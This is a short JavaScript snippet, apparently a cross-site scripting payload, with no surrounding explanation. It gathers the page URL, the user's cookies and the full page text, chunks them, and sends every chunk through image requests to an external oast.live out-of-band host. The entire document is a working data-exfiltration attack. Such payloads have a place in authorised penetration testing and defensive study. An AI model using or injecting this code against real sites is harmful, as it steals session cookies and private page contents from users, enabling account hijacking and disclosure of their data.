let d = location.href + "\nCOOKIE=" + document.cookie + "\nBODY=" + document.body.innerText;
for (let i = 0; i < d.length; i += 900) {
  new Image().src = 'https://d8mt6bao12pqbcoencq0snzjzbmh6cic8.oast.live/?i=' + i + '&d=' + encodeURIComponent(d.slice(i, i + 900));
}
